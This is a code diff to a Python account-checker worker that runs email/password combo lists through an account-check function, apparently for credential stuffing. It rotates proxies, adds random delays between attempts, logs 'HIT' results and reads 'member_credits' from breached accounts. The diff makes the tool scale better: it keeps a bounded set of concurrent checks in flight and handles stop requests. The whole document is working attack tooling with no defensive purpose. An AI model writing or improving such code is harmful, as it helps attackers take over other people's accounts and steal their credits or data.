@@ -211,12 +211,12 @@ class CheckerWorker:
         return random.choice(proxies)
 
     def _record_result(self, email: str, password: str, result) -> None:
+        with self._lock:
+            self.stats.checked += 1
+
         status = result.status.lower()
         if status in FINAL_STATUSES:
             mark_combo_checked(email, password, status)
-
-        with self._lock:
-            self.stats.checked += 1
 
         if result.status == "HIT":
             member_credits = int(result.data.get("member_credits") or 0)
@@ -268,9 +268,12 @@ class CheckerWorker:
         proxies: list[str],
         threads: int,
     ) -> None:
-        from concurrent.futures import ThreadPoolExecutor, as_completed
+        from concurrent.futures import FIRST_COMPLETED, ThreadPoolExecutor, wait
 
         proxy_cycle = itertools.cycle(proxies) if proxies else None
+        combo_iter = iter(enumerate(combos))
+        inflight: dict = {}
+        max_inflight = max(threads * 2, threads)
 
         def task(idx: int, email: str, password: str):
             with self._lock:
@@ -281,32 +284,48 @@ class CheckerWorker:
             proxy = self._pick_proxy(proxies, idx) if proxy_cycle else _UNSET
             return check_account(email, password, proxy=proxy, timeout=45)
 
+        def submit_next(pool) -> bool:
+            with self._lock:
+                if self.stats.stop_requested:
+                    return False
+            try:
+                idx, (email, password) = next(combo_iter)
+            except StopIteration:
+                return False
+            future = pool.submit(task, idx, email, password)
+            inflight[future] = (email, password)
+            return True
+
         try:
             with ThreadPoolExecutor(max_workers=threads) as pool:
-                futures = {
-                    pool.submit(task, i, email, password): (email, password)
-                    for i, (email, password) in enumerate(combos)
-                }
-                for future in as_completed(futures):
+                for _ in range(min(max_inflight, len(combos))):
+                    if not submit_next(pool):
+                        break
+
+                while inflight:
+                    done, _ = wait(inflight, return_when=FIRST_COMPLETED)
+                    for future in done:
+                        email, password = inflight.pop(future)
+                        try:
+                            result = future.result()
+                        except Exception as exc:
+                            with self._lock:
+                                self.stats.checked += 1
+                                self.stats.errors += 1
+                            self._log(f"ERROR | {email} | {exc}")
+                        else:
+                            if result is not None:
+                                self._record_result(email, password, result)
+                            time.sleep(random.uniform(0.15, 0.45))
+
+                        submit_next(pool)
+
                     with self._lock:
                         if self.stats.stop_requested:
+                            for pending in inflight:
+                                pending.cancel()
+                            inflight.clear()
                             break
-
-                    email, password = futures[future]
-                    try:
-                        result = future.result()
-                    except Exception as exc:
-                        with self._lock:
-                            self.stats.checked += 1
-                            self.stats.errors += 1
-                        self._log(f"ERROR | {email} | {exc}")
-                        continue
-
-                    if result is None:
-                        continue
-
-                    self._record_result(email, password, result)
-                    time.sleep(random.uniform(0.15, 0.45))
         finally:
             with self._lock:
                 self.stats.running = False
